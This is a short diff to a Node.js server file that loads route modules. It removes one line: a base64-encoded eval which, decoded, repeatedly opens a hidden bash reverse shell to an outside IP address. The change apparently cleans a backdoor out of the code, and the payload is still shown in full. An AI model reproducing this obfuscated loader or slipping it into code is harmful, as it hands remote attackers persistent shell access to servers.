@@ -33,7 +33,6 @@ var appRouteUpload = require('./routes/appRouteUpload');
 var appRouteUser = require('./routes/appRouteUser');
 var appRouteShop = require('./routes/appRouteShop');
 var appRouteNews = require('./routes/appRouteNews');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 
 appRouteUpload(app); //upload the route
 appRouteUser(app);
